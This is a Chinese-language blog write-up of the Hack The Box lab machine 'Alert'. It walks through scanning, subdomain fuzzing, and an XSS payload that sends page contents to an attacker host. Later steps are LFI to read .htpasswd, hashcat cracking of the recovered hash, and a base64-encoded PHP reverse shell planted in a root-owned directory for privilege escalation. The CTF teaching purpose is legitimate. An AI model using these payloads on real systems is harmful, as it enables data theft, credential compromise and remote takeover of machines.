---
layout: post
title: HTB——Alert
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Alert/01.png?raw=true)

# 0x01 信息收集

```bash
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0
                                                                             
[2025-04-02 04:36:08] [INFO] 暴力破解线程数: 1                               
[2025-04-02 04:36:08] [INFO] 开始信息扫描
[2025-04-02 04:36:08] [INFO] 最终有效主机数量: 1
[2025-04-02 04:36:08] [INFO] 开始主机扫描
[2025-04-02 04:36:08] [INFO] 有效端口数量: 233
[2025-04-02 04:36:08] [SUCCESS] 端口开放 10.129.231.188:80
[2025-04-02 04:36:08] [SUCCESS] 端口开放 10.129.231.188:22
[2025-04-02 04:36:08] [SUCCESS] 服务识别 10.129.231.188:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.11 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11.]                           
[2025-04-02 04:36:13] [SUCCESS] 服务识别 10.129.231.188:80 => [http]
[2025-04-02 04:36:13] [INFO] 存活端口数量: 2
[2025-04-02 04:36:14] [INFO] 开始漏洞扫描
[2025-04-02 04:36:14] [INFO] 加载的插件: ssh, webpoc, webtitle
[2025-04-02 04:36:14] [SUCCESS] 网站标题 http://10.129.231.188     状态码:301 长度:305    标题:301 Moved Permanently 重定向地址: http://alert.htb/        
[2025-04-02 04:36:15] [SUCCESS] 网站标题 http://alert.htb/index.php?page=alert 状态码:200 长度:966    标题:Alert - Markdown Viewer                        
[2025-04-02 04:36:45] [SUCCESS] 扫描已完成: 3/3


┌──(root㉿kali)-[/home/kali/TscanClient_linux]
└─# ./TscanClient_linux_amd64_v2.7.4 -h 10.129.231.188 -p 1-65535 -t 800

 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.5  Expired: 2026.01.01
[05:05:17] [INFO] Start IpScan:10.129.231.188
[05:05:17] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[05:05:18] [+] 10.129.231.188:80 open
[05:05:18] [+] 10.129.231.188:22 open
[05:05:19] [+] [TCP/SSH]  [OpenSSH 8.2p1 Ubuntu 4ubuntu0.11] 10.129.231.188:22 [SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11]
[05:05:19] [INFO] start SSH check 10.129.231.188:22
[05:05:19] [+] 开始 SshScan 任务: SSH://10.129.231.188:22
[05:05:21] [+] [TCP/HTTP] [200] [Apache-HTTP-Server/2.4.41][Apache-Web-Server][PHP][Apache/2.4.41 (Ubuntu)] http://10.129.231.188:80 [Alert - Markdown Viewer]
                                                          
[05:05:38] [+] alive ports is: 2
[05:05:38] [+] Ip扫描结束:10.129.231.188
[05:05:38] [INFO] Start UrlScan:http://10.129.231.188:80
[05:05:41] [+] [TCP/HTTP] [200] [PHP][Apache-Web-Server][Apache/2.4.41 (Ubuntu)][Apache-HTTP-Server/2.4.41] http://10.129.231.188:80 [Alert - Markdown Viewer]                      
                                                 
[05:05:41] [+] Url扫描结束:http://10.129.231.188:80
[05:05:41] [+] 项目任务完成:Default, Timeuse：23.520700866
[05:05:41] [+] 扫描结束,耗时: 24.249772379s
```

HTB的问题提示我们需要爆破子域名，那我们使用`gobuster`尝试爆破子域名。字典选用dirb下的common.txt。但是没有爆破到，我们先尝试对现有服务进行渗透。先是`contact`页面。我们尝试XSS获取管理员cookie，却发现后台AI根本就没有cookie。打到这里就没有头绪了。看了别的师傅的WP是使用fuff先把子域名爆出来，那我也来再爆一次试试。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Alert/02.png?raw=true)

```bash
┌──(root㉿kali)-[/home/kali]
└─# ffuf -w /usr/share/spiderfoot/spiderfoot/dicts/subdomains-10000.txt -u http://alert.htb -H "Host:FUZZ.alert.htb" -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://alert.htb
 :: Wordlist         : FUZZ: /usr/share/spiderfoot/spiderfoot/dicts/subdomains-10000.txt
 :: Header           : Host: FUZZ.alert.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [1021/9985] :: Job [1/1] :: 403 req/sec :: Duration: [0:00:05] :: Errors: 0 ::: Progress: [1073/9985] :: Job [1/1] :: 398 req/sec :: Duration: [0:00:05] :: Errors: 0 :statistics              [Status: 401, Size: 467, Words: 42, Lines: 15, Duration: 129ms]
```

确实是爆到了。

---

---

# 0x02 后台JS+LFI+.htpasswd利用

---

我们借助上面的XSS漏洞，先通过上传`md`文件塞入xss语句，再将分享链接传到`contact us`页面，我们在攻击机上监听返回信息即可得到index.php的完整代码

```javascript
<script>
fetch("http://alert.htb/index.php")
  .then(response => response.text())
  .then(data => {
    document.location = "http://10.10.16.6:54312/?echo=" + encodeURIComponent(data);
  })
  .catch(err => {
    console.log("Error fetching message page:", err);
  });
</script>
```

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <title>Alert - Markdown Viewer</title>
</head>
<body>
    <nav>
        <a href="index.php?page=alert">Markdown Viewer</a>
        <a href="index.php?page=contact">Contact Us</a>
        <a href="index.php?page=about">About Us</a>
        <a href="index.php?page=donate">Donate</a>
        <a href="index.php?page=messages">Messages</a>    </nav>
    <div class="container">
        <h1>Markdown Viewer</h1><div class="form-container">
            <form action="visualizer.php" method="post" enctype="multipart/form-data">
                <input type="file" name="file" accept=".md" required>
                <input type="submit" value="View Markdown">
            </form>
          </div>    </div>
    <footer>
        <p style="color: black;">© 2024 Alert. All rights reserved.</p>
    </footer>
</body>
</html>

```

获得到`messages`路由，我们接着看看此路由下的文件

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <title>Alert - Markdown Viewer</title>
</head>
<body>
    <nav>
        <a href="index.php?page=alert">Markdown Viewer</a>
        <a href="index.php?page=contact">Contact Us</a>
        <a href="index.php?page=about">About Us</a>
        <a href="index.php?page=donate">Donate</a>
        <a href="index.php?page=messages">Messages</a>    </nav>
    <div class="container">
        <h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li></ul>
    </div>
    <footer>
        <p style="color: black;">© 2024 Alert. All rights reserved.</p>
    </footer>
</body>
</html>
```

子路由的绝对文件地址看了WP，貌似是直接猜出来的`/var/www/statistics.alert.htb`.既然是`apache`那我们就尝试读取此工作目录下的`.htpasswd`。获得到数据为`albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/`。那我们再次尝试使用`hashcat`进行爆破。`hashcat`中匹配的模式为`Apache $apr1$ MD5, md5apr1, MD5 (APR)`，即1600.

```cmd
$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
Time.Started.....: Wed Apr 02 19:28:58 2025 (16 secs)
Time.Estimated...: Wed Apr 02 19:29:14 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   374.5 kH/s (8.55ms) @ Accel:64 Loops:125 Thr:32 Vec:1
Speed.#2.........:    18572 H/s (15.16ms) @ Accel:12 Loops:1 Thr:256 Vec:1
Speed.#*.........:   393.1 kH/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 6230016/14344385 (43.43%)
Rejected.........: 0/6230016 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:875-1000
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:999-1000
Candidate.Engine.: Device Generator
Candidates.#1....: llaywelfare -> libeth86
Candidates.#2....: 123456 -> redsox45
Hardware.Mon.#1..: Temp: 53c Util: 36% Core:1410MHz Mem:7000MHz Bus:8
Hardware.Mon.#2..: N/A

Started: Wed Apr 02 19:27:58 2025
Stopped: Wed Apr 02 19:29:17 2025
```

爆破出`albert:manchesterunited`后直接SSH登录，即可拿到`user.txt`

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Alert/03.png?raw=true)

---

# 0x03 Monitor特殊权限利用

---

提交后，提示我们去寻找`root`用户会定期执行的一个php文件，我们先查看当前用户有权力编辑的文件。因为我们要使用此文件进行提权，不是给予其输入就是篡改并等待`root`定期执行。

```bash
albert@alert:/var/www$ find / -type f -writable 2>/dev/null | grep php
/var/www/alert.htb/messages.php
/var/www/alert.htb/Parsedown.php
/var/www/alert.htb/contact.php
/var/www/alert.htb/visualizer.php
/var/www/alert.htb/index.php
/opt/website-monitor/config/configuration.php
```

到`/opt/website-monitor`下翻看，提交发现目标文件是`monitor.php`，但我们并无此文件编辑与执行权限。先查看此文件的内容。

```php
<?php
/*

Website Monitor
===============

Hello! This is the monitor script, which does the actual monitoring of websites
stored in monitors.json.

You can run this manually, but it’s probably better if you use a cron job.
Here’s an example of a crontab entry that will run it every minute:

* * * * * /usr/bin/php -f /path/to/monitor.php >/dev/null 2>&1

*/

include('config/configuration.php');

$monitors = json_decode(file_get_contents(PATH.'/monitors.json'));

foreach($monitors as $name => $url) {
        $response_data = array();
        $timestamp = time();
        $response_data[$timestamp]['timestamp'] = $timestamp;
        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_HEADER, true);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($curl);
        if(curl_exec($curl) === false) {
                $response_data[$timestamp]['error'] = curl_error($curl);
        }
        else {
                $info = curl_getinfo($curl);
                $http_code = $info['http_code'];
                $ms = $info['total_time_us'] / 1000;
                $response_data[$timestamp]['time'] = $ms;
                $response_data[$timestamp]['response'] = $http_code;
        }

        curl_close($curl);
        if(file_exists(PATH.'/monitors/'.$name)) {
                $data = json_decode(file_get_contents(PATH.'/monitors/'.$name), TRUE);
        }
        else {
                $data = array();
        }
        $data = array_merge($data, $response_data);
        $data = array_slice($data, -60);
        file_put_contents(PATH.'/monitors/'.$name, json_encode($data, JSON_PRETTY_PRINT));
}
```

发现`8080`端口开放了Website Monitor服务，且此服务目录在opt下，内部config文件夹拥有root权限。我们尝试往内写入反弹shell指令，并访问此服务的config目录下的木马文件以触发反弹。注意我们的流量转发要在SSH登陆时就配置好，且因为引号缘故要使用`base64`写入。

```bash
┌──(root㉿kali)-[/home/kali]
└─# ssh albert@10.129.231.188 -L 9000:localhost:8080
albert@10.129.231.188's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-200-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed 02 Apr 2025 12:53:08 PM UTC

  System load:           0.16
  Usage of /:            62.7% of 5.03GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             246
  Users logged in:       0
  IPv4 address for eth0: 10.129.231.188
  IPv6 address for eth0: dead:beef::250:56ff:feb9:c32d


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Apr  2 12:47:55 2025 from 127.0.0.1
albert@alert:~$ cd /opt
albert@alert:/opt$ ls
google  website-monitor
albert@alert:/opt$ cd website-monitor/
albert@alert:/opt/website-monitor$ cd config
albert@alert:/opt/website-monitor/config$ echo "PD9waHAgZXhlYygiL2Jpbi9iYXNoIC1jICdiYXNoIC1pID4vZGV2L3RjcC8xMC4xMC4xNi42LzU0MzEzIDA+JjEnIik7ID8+" | base64 -d > hack.php
albert@alert:/opt/website-monitor/config$ ls
1.php  configuration.php  hack.php
albert@alert:/opt/website-monitor/config$ cat hack.php
<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.16.6/54313 0>&1'"); ?>
```

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Alert/04.png?raw=true)

---

# 0x04 总结

感觉这题的提权还有其他打法。如果我们可以更改monitor的`json`文件，是不是也可以借助执行的`root`身份去遍历自己网站上本身可能权限只有`user`的提权or反弹脚本，来达到提权目的？总之是台很好的靶机，JS前端组合拳让我想起了`CISCN2025`初赛的那道JS。